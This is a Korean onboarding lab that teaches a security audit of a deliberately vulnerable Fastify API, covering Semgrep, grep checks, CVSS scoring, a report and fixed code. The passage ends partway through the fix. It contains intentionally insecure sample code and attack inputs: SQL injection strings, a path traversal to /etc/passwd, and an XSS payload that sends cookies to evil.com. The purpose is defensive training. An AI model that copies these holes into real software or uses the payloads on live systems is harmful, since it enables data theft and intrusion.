# Lab 10: 직접 보안 감사 수행하기

> **문서 ID**: ONBOARD-10-LAB10
> **버전**: 1.0.0 | **작성일**: 2026-04-12 | **작성자**: Implementer (Sonnet)
> **학습 대상**: 개발 경험은 있지만 보안 감사가 처음인 개발자
> **예상 소요 시간**: 3~4시간
> **난이도**: 중급~고급
> **선행 조건**:
>   - `07-security/coding/01-secure-patterns.md` 학습 완료
>   - `07-security/coding/02-owasp-patterns.md` 학습 완료
> **CSAP**: D-08 (접근 통제), D-09 (암호화), D-12 (개발 보안)

---

## 목차

1. [학습 목표](#1-학습-목표)
2. [사전 지식 체크 — OWASP A01~A10](#2-사전-지식-체크--owasp-a01a10)
3. [실습 환경 준비](#3-실습-환경-준비)
4. [단계별 보안 감사](#4-단계별-보안-감사)
   - [Step 1: Semgrep 자동 스캔](#step-1-semgrep-자동-스캔-실행-및-결과-해석)
   - [Step 2: 하드코딩 시크릿 탐지](#step-2-하드코딩-시크릿-수동-탐지)
   - [Step 3: SQL 인젝션 패턴 탐지](#step-3-sql-인젝션-취약점-패턴-탐지)
   - [Step 4: 인증 누락 엔드포인트 탐지](#step-4-인증-누락-api-엔드포인트-탐지)
   - [Step 5: XSS 취약점 탐지](#step-5-xss-취약점-패턴-탐지)
5. [취약점 보고서 작성](#5-취약점-보고서-작성)
6. [취약점 수정하기](#6-취약점-수정하기)
7. [수정 후 재검증](#7-수정-후-재검증)
8. [Q-Gate G5 자가 평가](#8-q-gate-g5-자가-평가)
9. [보안 감사 결과를 PDCA에 기록하기](#9-보안-감사-결과를-pdca에-기록하기)
10. [학습 체크리스트](#학습-체크리스트)
11. [다음 단계](#다음-단계)

---

## 1. 학습 목표

이 랩을 완료하면 다음을 할 수 있습니다.

1. **Semgrep**을 사용하여 코드에서 보안 취약점 패턴을 자동으로 탐지한다
2. **수동 코드 리뷰** 기법으로 자동화 도구가 놓친 취약점을 찾는다
3. **CVSS 점수**를 계산하여 취약점의 심각도를 정량적으로 표현한다
4. **취약점 보고서**를 CSAP 항목에 매핑하여 공식 문서를 작성한다
5. **안전한 코드**로 수정하고 재검증을 통해 취약점이 제거됐음을 확인한다
6. **Q-Gate G5** (OWASP Top 10) 기준을 자가 평가한다

> ⚠️ **중요**: 이 랩에서 생성하는 취약한 샘플 코드는 **교육 목적 전용**입니다.
> 실제 코드베이스에 추가하지 마십시오. `tmp/` 디렉토리에서만 작업합니다.

---

## 2. 사전 지식 체크 — OWASP A01~A10

보안 감사를 시작하기 전에 기본 지식을 확인합니다.

```mermaid
graph TD
    subgraph "OWASP Top 10 2021 — 이 랩에서 다루는 항목"
        A01["A01: Broken Access Control\n⭐ Step 4에서 실습"]
        A02["A02: Cryptographic Failures\n⭐ Step 2에서 실습"]
        A03["A03: Injection\n⭐ Step 3에서 실습"]
        A04["A04: Insecure Design\n개념 이해"]
        A05["A05: Security Misconfiguration\n⭐ Step 2에서 실습"]
        A06["A06: Vulnerable Components\nSemgrep이 감지"]
        A07["A07: Auth Failures\n⭐ Step 4에서 실습"]
        A08["A08: Integrity Failures\nCI/CD 파이프라인"]
        A09["A09: Logging Failures\n⭐ Step 4에서 실습"]
        A10["A10: SSRF\n개념 이해"]
    end

    style A01 fill:#C62828,color:#fff
    style A02 fill:#C62828,color:#fff
    style A03 fill:#C62828,color:#fff
    style A05 fill:#E65100,color:#fff
    style A07 fill:#E65100,color:#fff
    style A09 fill:#E65100,color:#fff
```

### 간단 퀴즈 (스스로 답해보기)

진행 전에 다음 질문에 답해보십시오. 모르는 것이 있으면 `02-owasp-patterns.md`를 다시 읽으십시오.

| 번호 | 질문 | 관련 OWASP |
|------|------|-----------|
| Q1 | 매개변수화 쿼리가 아닌 SQL 문자열 결합이 왜 위험한가? | A03 |
| Q2 | JWT 토큰을 `jwt.decode()`로 검증하면 안 되는 이유는? | A07 |
| Q3 | 비밀번호를 MD5로 해시하면 왜 취약한가? | A02 |
| Q4 | API 엔드포인트에서 에러 스택 트레이스를 반환하면 안 되는 이유는? | A05 |
| Q5 | RBAC 검사가 없는 엔드포인트는 어떤 OWASP에 해당하는가? | A01 |

---

## 3. 실습 환경 준비

### 3.1 Semgrep CLI 설치

```bash
# pip을 사용하여 Semgrep 설치
pip3 install semgrep

# 또는 Homebrew (macOS)
# brew install semgrep

# 설치 확인
semgrep --version
# 출력 예: 1.x.x
```

### 3.2 작업 디렉토리 생성

```bash
# 실습용 임시 디렉토리 생성 (실제 코드베이스와 분리)
mkdir -p /tmp/security-audit-lab
cd /tmp/security-audit-lab
```

### 3.3 취약한 샘플 코드 파일 생성

다음 명령으로 실습용 취약한 코드를 생성합니다.
이 코드는 실제로 발생할 수 있는 취약점 패턴을 의도적으로 포함합니다.

```bash
# 취약한 코드 파일 1: 여러 취약점이 포함된 API 핸들러
cat > /tmp/security-audit-lab/vulnerable-api.ts << 'VULN_CODE'
// WARNING: 교육 목적 취약한 코드 — 실제 사용 절대 금지
import { FastifyRequest, FastifyReply } from 'fastify'
import { Pool } from 'pg'
import crypto from 'crypto'

// 취약점 1: 하드코딩된 시크릿 (A02, CSAP D-09 위반)
const DB_PASSWORD = 'super-secret-password-123'
const JWT_SECRET = 'my-jwt-secret-key'
const ANTHROPIC_API_KEY = 'sk-ant-api03-hardcoded-key-here'
const ADMIN_TOKEN = 'admin-bypass-token-abc123'

// 취약점 2: 하드코딩 연결 문자열
const pool = new Pool({
  connectionString: 'postgresql://admin:super-secret-password-123@prod-db:5432/saas',
})

// 취약점 3: 인증 없는 API 엔드포인트 (A01, CSAP D-08 위반)
export async function getAllUsersHandler(
  request: FastifyRequest,
  reply: FastifyReply,
) {
  // 누구나 호출 가능! 인증/인가 검사 없음
  const users = await pool.query('SELECT * FROM users')
  return reply.send(users.rows)
}

// 취약점 4: SQL 인젝션 (A03, CSAP D-12 위반)
export async function getUserByEmailHandler(
  request: FastifyRequest<{ Querystring: { email: string } }>,
  reply: FastifyReply,
) {
  const { email } = request.query
  // 직접 문자열 결합! SQL 인젝션 가능
  const query = `SELECT * FROM users WHERE email = '${email}'`
  const result = await pool.query(query)
  return reply.send(result.rows[0])
}

// 취약점 5: 민감 정보 로그 출력 (A09, CSAP D-06 위반)
export async function loginHandler(
  request: FastifyRequest<{ Body: { email: string; password: string } }>,
  reply: FastifyReply,
) {
  const { email, password } = request.body
  // 비밀번호가 로그에 출력됨!
  console.log(`Login attempt: email=${email}, password=${password}`)

  const result = await pool.query(`SELECT * FROM users WHERE email = '${email}'`)
  const user = result.rows[0]

  if (!user) {
    return reply.status(401).send({ error: 'User not found', email })
  }

  // 취약점 6: 약한 해시 (MD5 — A02 위반)
  const inputHash = crypto.createHash('md5').update(password).digest('hex')
  if (user.password_hash !== inputHash) {
    // 취약점 7: 에러 메시지에 DB 정보 노출
    return reply.status(401).send({
      error: 'Invalid password',
      dbUser: user.email,
      dbSchema: 'public.users',
      queryUsed: `SELECT * FROM users WHERE email = '${email}'`,
    })
  }

  return reply.send({ success: true, user })
}

// 취약점 8: XSS 취약점 (A03 — HTML 주입)
export async function renderProfileHandler(
  request: FastifyRequest<{ Params: { name: string } }>,
  reply: FastifyReply,
) {
  const { name } = request.params
  // 사용자 입력을 검증 없이 HTML에 삽입
  const html = `
    <html>
      <body>
        <h1>안녕하세요, ${name}님!</h1>
        <p>프로필 페이지입니다.</p>
      </body>
    </html>
  `
  return reply.type('text/html').send(html)
}

// 취약점 9: 입력 검증 없는 파일 경로 (Path Traversal — A01)
export async function downloadFileHandler(
  request: FastifyRequest<{ Querystring: { filename: string } }>,
  reply: FastifyReply,
) {
  const { filename } = request.query
  // ../../../etc/passwd 같은 경로 주입 가능
  const filePath = `/app/uploads/${filename}`
  const fs = await import('fs/promises')
  const content = await fs.readFile(filePath, 'utf-8')
  return reply.send(content)
}

// 취약점 10: 관리자 권한 하드코딩 우회 (A01, A07)
export async function adminActionHandler(
  request: FastifyRequest,
  reply: FastifyReply,
) {
  const adminToken = request.headers['x-admin-token']
  // 하드코딩된 토큰으로 우회 가능
  if (adminToken === 'admin-bypass-token-abc123') {
    // 검증 없이 관리자 권한 허용
    await deleteAllLogs()
    return reply.send({ success: true })
  }
  return reply.status(403).send({ error: 'Forbidden' })
}

async function deleteAllLogs() {
  await pool.query('DELETE FROM audit_logs')
}
VULN_CODE

echo "취약한 샘플 코드 파일 생성 완료: /tmp/security-audit-lab/vulnerable-api.ts"
```

---

## 4. 단계별 보안 감사

### Step 1: Semgrep 자동 스캔 실행 및 결과 해석

Semgrep은 코드 패턴을 기반으로 보안 취약점을 자동으로 탐지합니다.

```bash
# Semgrep 기본 스캔 실행 (OWASP Top 10 규칙셋)
cd /tmp/security-audit-lab
semgrep --config=auto vulnerable-api.ts

# 또는 특정 카테고리로 스캔
semgrep --config="p/typescript" vulnerable-api.ts
semgrep --config="p/secrets" vulnerable-api.ts
semgrep --config="p/sql-injection" vulnerable-api.ts
semgrep --config="p/xss" vulnerable-api.ts
```

### Semgrep 결과 해석 방법

```
예시 출력:
vulnerable-api.ts
  typescript.jwt.security.jwt-decode-without-verify.jwt-decode-without-verify
  │ 심각도: ERROR
  │ 위치: 45행
  │ 내용: jwt.decode()는 서명을 검증하지 않습니다. jwt.verify()를 사용하십시오.
  │
  ├── 45│ const decoded = jwt.decode(token)
  │
  └── 수정 방법: https://semgrep.dev/r/typescript.jwt...
```

각 결과 항목을 이해하는 방법.

| 필드 | 의미 |
|------|------|
| `심각도 ERROR` | 즉시 수정 필요 — 실제 취약점 |
| `심각도 WARNING` | 주의 필요 — 잠재적 취약점 |
| `심각도 INFO` | 정보 — 개선 권장 |
| `위치 45행` | 취약점이 있는 소스 코드 줄 번호 |

### 직접 Semgrep 규칙 작성

프로젝트에 특화된 규칙을 직접 작성할 수 있습니다.

```yaml
# /tmp/security-audit-lab/custom-rules.yaml
# 이 프로젝트 전용 보안 규칙

rules:
  # 하드코딩 Anthropic API 키 탐지
  - id: hardcoded-anthropic-key
    pattern: |
      $VAR = "sk-ant-..."
    message: "Anthropic API 키가 하드코딩되어 있습니다. 환경 변수를 사용하십시오. (CSAP D-09)"
    languages: [typescript, javascript]
    severity: ERROR
    metadata:
      category: security
      cwe: "CWE-798"
      csap: "D-09"

  # SQL 문자열 결합 탐지
  - id: sql-string-concatenation
    patterns:
      - pattern: |
          `SELECT ... ${...}`
      - pattern: |
          "SELECT ... " + $VAR
    message: "SQL 문자열 결합은 SQL 인젝션 위험이 있습니다. 매개변수화 쿼리를 사용하십시오. (CSAP D-12)"
    languages: [typescript, javascript]
    severity: ERROR
    metadata:
      category: security
      cwe: "CWE-89"
      csap: "D-12"

  # console.log에 비밀번호 포함 탐지
  - id: password-in-log
    patterns:
      - pattern: console.log(..., $PASS, ...)
        where:
          - metavariable-regex:
              metavariable: $PASS
              regex: "(password|passwd|secret|token|key)"
    message: "비밀번호나 민감 정보를 로그에 출력하면 안 됩니다. (CSAP D-06)"
    languages: [typescript, javascript]
    severity: WARNING
```

```bash
# 커스텀 규칙으로 스캔
semgrep --config=/tmp/security-audit-lab/custom-rules.yaml vulnerable-api.ts
```

---

### Step 2: 하드코딩 시크릿 수동 탐지

Semgrep이 모든 시크릿을 찾지 못할 수 있습니다. 수동 검색으로 보완합니다.

```bash
# 일반적인 시크릿 패턴 검색
cd /tmp/security-audit-lab

# 1. API 키 패턴 (sk-, api-key, token 등)
grep -rn "sk-\|api_key\|apikey\|apiKey\|API_KEY" vulnerable-api.ts

# 2. 비밀번호 하드코딩
grep -rn "password.*=.*['\"]" vulnerable-api.ts

# 3. Secret/Token 할당
grep -rn "secret\|SECRET\|token.*=.*['\"]" vulnerable-api.ts

# 4. 연결 문자열에 자격증명 포함
grep -rn "postgresql://\|mysql://\|redis://" vulnerable-api.ts
```

```bash
# 실제 프로젝트에서도 주기적으로 실행 (CI/CD에서 자동화)
# /data/ai-saas 전체 스캔 (교육 목적으로 이해만)
cd /data/ai-saas
grep -rn "sk-ant-api" --include="*.ts" --include="*.js" . | grep -v "node_modules" | grep -v ".env"
# → 결과가 없어야 합니다 (하드코딩 없음)
```

### 탐지 결과 기록

```
발견된 하드코딩 시크릿:

1. 위치: vulnerable-api.ts:5
   내용: const DB_PASSWORD = 'super-secret-password-123'
   유형: 데이터베이스 비밀번호
   OWASP: A02, A05
   CSAP: D-09
   심각도: Critical

2. 위치: vulnerable-api.ts:6
   내용: const JWT_SECRET = 'my-jwt-secret-key'
   유형: JWT 서명 키
   OWASP: A02, A07
   CSAP: D-09
   심각도: Critical

3. 위치: vulnerable-api.ts:7
   내용: const ANTHROPIC_API_KEY = 'sk-ant-api03-hardcoded-key-here'
   유형: AI API 키
   OWASP: A02, A05
   CSAP: D-09
   심각도: Critical

4. 위치: vulnerable-api.ts:12
   내용: connectionString: 'postgresql://admin:super-secret-password-123@prod-db...'
   유형: DB 연결 문자열 (자격증명 포함)
   OWASP: A02, A05
   CSAP: D-09
   심각도: Critical
```

---

### Step 3: SQL 인젝션 취약점 패턴 탐지

```bash
# SQL 문자열 결합 패턴 탐지
grep -n "\`SELECT\|\"SELECT\|'SELECT" vulnerable-api.ts
grep -n "\${" vulnerable-api.ts
grep -n "pool.query.*\`" vulnerable-api.ts
```

```bash
# 실제 SQL 인젝션 공격 시뮬레이션 (이해를 위한 예시)
# 취약한 코드: SELECT * FROM users WHERE email = '${email}'
# 공격 입력: ' OR '1'='1
# 결과 SQL: SELECT * FROM users WHERE email = '' OR '1'='1'
# 효과: 모든 사용자 데이터 유출

# 더 위험한 공격: '; DROP TABLE users; --
# 결과 SQL: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
# 효과: users 테이블 삭제!
```

### SQL 인젝션 취약점 목록 작성

```
발견된 SQL 인젝션 취약점:

1. 위치: vulnerable-api.ts:24
   함수: getAllUsersHandler
   취약 코드: pool.query('SELECT * FROM users')
   문제: 인증 없이 전체 사용자 조회 가능 (인증 문제와 결합)
   OWASP: A01, A03
   CSAP: D-08, D-12

2. 위치: vulnerable-api.ts:33
   함수: getUserByEmailHandler
   취약 코드: `SELECT * FROM users WHERE email = '${email}'`
   공격 예: email = "' OR '1'='1"
   효과: 모든 사용자 데이터 유출
   OWASP: A03
   CSAP: D-12
   심각도: Critical

3. 위치: vulnerable-api.ts:43
   함수: loginHandler
   취약 코드: `SELECT * FROM users WHERE email = '${email}'`
   공격 예: email = "admin@example.com' --"
   효과: 비밀번호 없이 로그인 가능
   OWASP: A03, A07
   CSAP: D-12
   심각도: Critical
```

---

### Step 4: 인증 누락 API 엔드포인트 탐지

```bash
# 인증 검사 코드가 없는 핸들러 탐지
# 방법: authorization 또는 verifyToken 사용 여부 확인

grep -n "async function.*Handler" vulnerable-api.ts
# → 모든 핸들러 함수 목록

grep -n "authorization\|verifyToken\|hasPermission\|x-user-id" vulnerable-api.ts
# → 인증 코드 위치

# 핸들러 수 vs 인증 코드 수 비교
echo "핸들러 수: $(grep -c 'async function.*Handler' vulnerable-api.ts)"
echo "인증 코드 수: $(grep -c 'authorization\|verifyToken\|hasPermission' vulnerable-api.ts)"
```

### 감사 로그 누락 탐지

CSAP D-06에 따라 모든 민감 작업에는 감사 로그가 있어야 합니다.

```bash
# 감사 로그 함수 호출 여부 확인
grep -n "auditLog\|logSecurityEvent\|logSubscriptionEvent" vulnerable-api.ts
# → 결과 없음 → 감사 로그 전혀 없음 (A09 위반)

# 이 프로젝트의 올바른 패턴 확인 (참고용)
grep -rn "logSecurityEvent\|logAiEvent\|logSubscriptionEvent" \
  /data/ai-saas/platform/services/ \
  --include="*.ts" | head -10
```

```
발견된 인증/감사 누락 취약점:

1. 위치: vulnerable-api.ts:22~27
   함수: getAllUsersHandler
   문제: 인증 없이 전체 사용자 목록 조회 가능
   OWASP: A01, A09
   CSAP: D-08, D-06
   심각도: Critical

2. 위치: vulnerable-api.ts:29~37
   함수: getUserByEmailHandler
   문제: 인증 없이 사용자 조회 가능 + 감사 로그 없음
   OWASP: A01, A09
   CSAP: D-08, D-06
   심각도: High

3. 위치: vulnerable-api.ts:39~70
   함수: loginHandler
   문제: 비밀번호가 로그에 출력됨 (console.log) + 감사 로그 없음
   OWASP: A09
   CSAP: D-06
   심각도: High

4. 위치: vulnerable-api.ts:91~99
   함수: adminActionHandler
   문제: 하드코딩 토큰으로 관리자 권한 우회 가능
   OWASP: A01, A07
   CSAP: D-08
   심각도: Critical
```

---

### Step 5: XSS 취약점 패턴 탐지

```bash
# XSS 취약점 패턴 탐지
grep -n "innerHTML\|dangerouslySetInnerHTML\|document.write" vulnerable-api.ts

# 서버 사이드 HTML 주입 탐지
grep -n "reply.*html\|res.*html\|text/html" vulnerable-api.ts

# 사용자 입력이 HTML에 직접 포함되는 패턴
grep -n "\${.*request\.\|<\${" vulnerable-api.ts
```

```bash
# XSS 공격 시뮬레이션 이해
# 취약한 코드: `<h1>안녕하세요, ${name}님!</h1>`
# 공격 입력: <script>document.cookie를 공격자에게 전송</script>
# 결과 HTML: <h1>안녕하세요, <script>...</script>님!</h1>
# 효과: 다른 사용자의 쿠키/세션 탈취
```

```
발견된 XSS 취약점:

1. 위치: vulnerable-api.ts:72~84
   함수: renderProfileHandler
   취약 코드: `<h1>안녕하세요, ${name}님!</h1>`
   공격 예: name = "<script>fetch('evil.com/steal?c='+document.cookie)</script>"
   효과: XSS — 사용자 세션 탈취
   OWASP: A03 (Injection → XSS)
   CSAP: D-12
   심각도: High

2. 위치: vulnerable-api.ts:86~94
   함수: downloadFileHandler
   취약 코드: /app/uploads/${filename}
   공격 예: filename = "../../etc/passwd"
   효과: Path Traversal — 시스템 파일 노출
   OWASP: A01
   CSAP: D-12
   심각도: Critical
```

---

## 5. 취약점 보고서 작성

### 5.1 CVSS 점수 계산 방법

CVSS(Common Vulnerability Scoring System)는 취약점의 심각도를 0~10점으로 정량화합니다.

```mermaid
graph TD
    subgraph "CVSS v3.1 기본 지표"
        AV["공격 벡터\nAttack Vector\n네트워크/인접/로컬/물리"]
        AC["공격 복잡도\nAttack Complexity\n낮음/높음"]
        PR["권한 요구\nPrivileges Required\n없음/낮음/높음"]
        UI["사용자 상호작용\nUser Interaction\n없음/필요"]
        S["범위\nScope\n변경/불변"]
        C["기밀성 영향\nConfidentiality\n없음/낮음/높음"]
        I["무결성 영향\nIntegrity\n없음/낮음/높음"]
        A["가용성 영향\nAvailability\n없음/낮음/높음"]
    end

    subgraph "심각도 등급"
        CRITICAL["Critical: 9.0~10.0\n즉시 수정 (24시간 이내)"]
        HIGH["High: 7.0~8.9\n빠른 수정 (1주일 이내)"]
        MEDIUM["Medium: 4.0~6.9\n계획적 수정 (1달 이내)"]
        LOW["Low: 0.1~3.9\n다음 릴리즈에서 수정"]
    end

    style CRITICAL fill:#C62828,color:#fff
    style HIGH fill:#E65100,color:#fff
    style MEDIUM fill:#F9A825,color:#000
    style LOW fill:#2E7D32,color:#fff
```

### CVSS 계산 예시 — SQL 인젝션

```
취약점: getUserByEmailHandler의 SQL 인젝션

공격 벡터 (AV): 네트워크 (N) — 인터넷으로 접근 가능
공격 복잡도 (AC): 낮음 (L) — 특별한 조건 없이 공격 가능
권한 요구 (PR): 없음 (N) — 인증 없이도 가능
사용자 상호작용 (UI): 없음 (N) — 자동화 공격 가능
범위 (S): 불변 (U) — 동일 시스템에만 영향
기밀성 영향 (C): 높음 (H) — 모든 사용자 데이터 유출 가능
무결성 영향 (I): 높음 (H) — 데이터 수정/삭제 가능
가용성 영향 (A): 높음 (H) — DROP TABLE로 서비스 중단 가능

CVSS v3.1 점수: 9.8 (Critical)
벡터 문자열: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

### 5.2 취약점 보고서 템플릿

```markdown
# 보안 감사 보고서

**감사 대상**: vulnerable-api.ts (교육 샘플)
**감사 일시**: 2026-04-12
**감사자**: 홍길동
**도구**: Semgrep 1.x, 수동 코드 리뷰

---

## 발견된 취약점 요약

| ID | 위치 | 유형 | CVSS | 심각도 | OWASP | CSAP |
|----|------|------|------|--------|-------|------|
| VULN-001 | :5~8 | 하드코딩 시크릿 | 9.1 | Critical | A02, A05 | D-09 |
| VULN-002 | :33 | SQL 인젝션 | 9.8 | Critical | A03 | D-12 |
| VULN-003 | :43 | SQL 인젝션 | 9.8 | Critical | A03 | D-12 |
| VULN-004 | :22 | 인증 누락 | 9.1 | Critical | A01 | D-08 |
| VULN-005 | :97 | 관리자 우회 | 9.8 | Critical | A01, A07 | D-08 |
| VULN-006 | :45 | 비밀번호 로그 | 7.5 | High | A09 | D-06 |
| VULN-007 | :56 | 약한 해시(MD5) | 7.5 | High | A02 | D-09 |
| VULN-008 | :61 | 에러 정보 노출 | 5.3 | Medium | A05 | D-12 |
| VULN-009 | :75 | XSS | 6.1 | Medium | A03 | D-12 |
| VULN-010 | :88 | Path Traversal | 7.5 | High | A01 | D-12 |

---

## 상세 취약점 분석

### VULN-001: 하드코딩된 시크릿

**위치**: vulnerable-api.ts, 5~8행
**설명**: API 키, JWT 시크릿, 데이터베이스 비밀번호가 소스코드에 하드코딩되어 있습니다.
         코드 리포지토리에 접근 가능한 누구나 이 시크릿을 알 수 있습니다.
**영향**: 시크릿 유출 → 인증 우회, 데이터 유출, 서비스 가장
**CVSS**: 9.1 (Critical)
**수정 방법**: 환경 변수 또는 Vault를 사용하십시오.
```

---

## 6. 취약점 수정하기

### 수정된 안전한 코드

```typescript
// /tmp/security-audit-lab/fixed-api.ts
// 모든 취약점이 수정된 안전한 버전

import { FastifyRequest, FastifyReply } from 'fastify'
import { Pool } from 'pg'
import bcrypt from 'bcrypt'
import { z } from 'zod'
import { createHash } from 'crypto'

// ✅ 수정 1: 환경 변수에서 시크릿 로드 (CSAP D-09)
const DB_PASSWORD = process.env.DB_PASSWORD
const JWT_SECRET = process.env.JWT_SECRET
const ANTHROPIC_API_KEY = process.env.ANTHROPIC_API_KEY

// 시작 시 필수 환경 변수 검증
function validateEnvironmentVariables(): void {
  const required = ['DATABASE_URL', 'JWT_SECRET', 'ANTHROPIC_API_KEY']
  for (const key of required) {
    if (!process.env[key]) {
      throw new Error(`필수 환경 변수 누락: ${key}`)
    }
  }
}
validateEnvironmentVariables()

// ✅ 수정 2: 환경 변수로 DB 연결
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
})

// ✅ 입력 검증 스키마 (CSAP D-12)
const getUserByEmailSchema = z.object({
  email: z.string().email('유효한 이메일 형식이 아닙니다'),
})

const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8).max(128),
})

const filenameSchema = z.object({
  filename: z.string()
    .min(1).max(255)
    .regex(/^[a-zA-Z0-9._-]+$/, '파일명에 허용되지 않는 문자가 포함되어 있습니다'),
})

// ✅ 수정 3: 인증 미들웨어 (CSAP D-08)
async function requireAuth(request: FastifyRequest, reply: FastifyReply): Promise<void> {
  const authHeader = request.headers.authorization
  if (!authHeader?.startsWith('Bearer ')) {
    await reply.status(401).send({
      success: false,
      error: { code: 'AUTH_NO_TOKEN', message: '인증 토큰이 필요합니다' },
    })
    return
  }

  const token = authHeader.split(' ')[1]

  // auth-service로 토큰 검증 위임
  const verifyResponse = await fetch(`${process.env.AUTH_SERVICE_URL}/auth/verify`, {
    headers: { authorization: authHeader },
    signal: AbortSignal.timeout(5000),
  })

  if (!verifyResponse.ok) {
    await reply.status(401).send({
      success: false,
      error: { code: 'AUTH_INVALID', message: '유효하지 않은 토큰입니다' },
    })
    return
  }

  const { data } = await verifyResponse.json()
  ;(request as any).user = data
}

// ✅ 수정 4: 감사 로그 함수 (CSAP D-06)
async function auditLog(params: {
  actor: string
  action: string
  target: string
  ip: string
  metadata?: Record<string, unknown>
}): Promise<void> {
  // 실제 프로젝트에서는 @public-saas/audit-sdk 사용
  const logEntry = {
    ...params,
    timestamp: new Date().toISOString(),
    service: 'api-service',
  }
  // append-only 감사 로그 기록 (CSAP D-06)
  process.stdout.write(JSON.stringify(logEntry) + '\n')
}

// ✅ 수정 5: getAllUsersHandler — 인증 + 권한 검사 추가
export async function getAllUsersHandler(
  request: FastifyRequest,
  reply: FastifyReply,
): Promise<void> {
  // 인증 검사 (CSAP D-08)
  await requireAuth(request, reply)
  if (reply.sent) return

  const user = (request as any).user

  // RBAC 권한 검사
  if (!['ADMIN', 'SUPER_ADMIN'].includes(user.role)) {
    await reply.status(403).send({
      success: false,
      error: { code: 'FORBIDDEN', message: '관리자만 사용자 목록을 조회할 수 있습니다' },
    })
    return
  }

  // 감사 로그 (CSAP D-06)
  await auditLog({
    actor: user.id,
    action: 'USER_LIST_READ',
    target: 'users',
    ip: request.ip,
  })

  // 매개변수화 쿼리 (CSAP D-12)
  const result = await pool.query(
    'SELECT id, email, name, role, created_at FROM users ORDER BY created_at DESC LIMIT 100',
  )
  await reply.send({ success: true, data: result.rows })
}

// ✅ 수정 6: getUserByEmailHandler — SQL 인젝션 수정
export async function getUserByEmailHandler(
  request: FastifyRequest<{ Querystring: { email: string } }>,
  reply: FastifyReply,
): Promise<void> {
  await requireAuth(request, reply)
  if (reply.sent) return

  // 입력 검증 (CSAP D-12)
  const parseResult = getUserByEmailSchema.safeParse(request.query)
  if (!parseResult.success) {
    await reply.status(400).send({
      success: false,
      error: { code: 'VALIDATION_ERROR', message: '유효한 이메일을 입력하십시오' },
    })
    return
  }

  const { email } = parseResult.data

  // 매개변수화 쿼리 — SQL 인젝션 방지 (CSAP D-12)
  const result = await pool.query(
    'SELECT id, email, name, role FROM users WHERE email = $1',
    [email],  // $1에 email이 안전하게 바인딩됨
  )

  const user = (request as any).user
  await auditLog({ actor: user.id, action: 'USER_QUERY', target: email, ip: request.ip })

  await reply.send({ success: true, data: result.rows[0] ?? null })
}

// ✅ 수정 7: loginHandler — 비밀번호 로그 제거, bcrypt 사용, 에러 정보 최소화
export async function loginHandler(
  request: FastifyRequest<{ Body: { email: string; password: string } }>,
  reply: FastifyReply,
): Promise<void> {
  // 입력 검증 (CSAP D-12)
  const parseResult = loginSchema.safeParse(request.body)
  if (!parseResult.success) {
    await reply.status(400).send({
      success: false,
      error: { code: 'VALIDATION_ERROR', message: '이메일과 비밀번호를 올바르게 입력하십시오' },
    })
    return
  }

  const { email, password } = parseResult.data
  // ✅ 비밀번호를 절대 로그에 출력하지 않음 (CSAP D-06)

  try {
    // 매개변수화 쿼리 (CSAP D-12)
    const result = await pool.query(
      'SELECT id, email, name, role, password_hash FROM users WHERE email = $1',
      [email],
    )

    const user = result.rows[0]

    // 사용자 없음 + 비밀번호 불일치를 동일한 메시지로 처리 (타이밍 공격 방지)
    if (!user) {
      // 타이밍 공격 방지: 사용자 없어도 동일한 시간 소요
      await bcrypt.compare(password, '$2b$12$invalidHashToPreventTimingAttack')
      await auditLog({ actor: 'anonymous', action: 'LOGIN_FAIL_USER_NOT_FOUND', target: 'system', ip: request.ip })
      await reply.status(401).send({
        success: false,
        error: { code: 'AUTH_FAILED', message: '이메일 또는 비밀번호가 올바르지 않습니다' },
      })
      return
    }

    // ✅ bcrypt 비교 — MD5 대신 bcrypt 사용 (CSAP D-09)
    const passwordMatch = await bcrypt.compare(password, user.password_hash)
    if (!passwordMatch) {
      await auditLog({ actor: user.id, action: 'LOGIN_FAIL_WRONG_PASSWORD', target: 'system', ip: request.ip })
      await reply.status(401).send({
        success: false,
        error: { code: 'AUTH_FAILED', message: '이메일 또는 비밀번호가 올바르지 않습니다' },
      })
      return
    }

    await auditLog({ actor: user.id, action: 'LOGIN_SUCCESS', target: 'system', ip: request.ip })
    // 비밀번호 해시는 응답에 포함하지 않음
    const { password_hash: _omit, ...safeUser } = user
    await reply.send({ success: true, data: { user: safeUser } })

  } catch (error) {
    // ✅ 에러 메시지에 내부 정보 노출 금지 (CSAP D-12)
    const errorId = createHash('sha256').update(String(Date.now())).digest('hex').slice(0, 8)
    // 내부 오류는 서버 로그에만 기록
    process.stderr.write(`[ERROR] loginHandler 오류 (errorId: ${errorId}): ${String(error)}\n`)
    await reply.status(500).send({
      success: false,
      error: { code: 'INTERNAL_ERROR', message: '서버 오류가 발생했습니다', errorId },
    })
  }
}

// ✅ 수정 8: renderProfileHandler — HTML 이스케이프 (XSS 방지)
export async function renderProfileHandler(
  request: FastifyRequest<{ Params: { name: string } }>,
  reply: FastifyReply,
): Promise<void> {
  const rawName = request.params.name

  // HTML 특수문자 이스케이프 (XSS 방지 — CSAP D-12)
  const escapedName = rawName
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')

  const html = `
    <!DOCTYPE html>
    <html lang="ko">
      <head>
        <meta charset="UTF-8">
        <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
      </head>
      <body>
        <h1>안녕하세요, ${escapedName}님!</h1>
        <p>프로필 페이지입니다.</p>
      </body>
    </html>
  `
  await reply.type('text/html').send(html)
}

// ✅ 수정 9: downloadFileHandler — Path Traversal 방지
export async function downloadFileHandler(
  request: FastifyRequest<{ Querystring: { filename: string } }>,
  reply: FastifyReply,
): Promise<void> {
  await requireAuth(request, reply)
  if (reply.sent) return

  // 입력 검증 — 허용된 파일명 패턴만 허용 (CSAP D-12)
  const parseResult = filenameSchema.safeParse(request.query)
  if (!parseResult.success) {
    await reply.status(400).send({
      success: false,
      error: { code: 'INVALID_FILENAME', message: '허용되지 않는 파일명입니다' },
    })
    return
  }

  const { filename } = parseResult.data

  // Path Traversal 방지: 절대 경로로 정규화 후 허용 경로 확인
  const path = await import('path')
  const allowedDir = '/app/uploads'
  const resolvedPath = path.resolve(allowedDir, filename)

  // 정규화된 경로가 허용된 디렉토리 내부인지 확인
  if (!resolvedPath.startsWith(allowedDir)) {
    await reply.status(403).send({
      success: false,
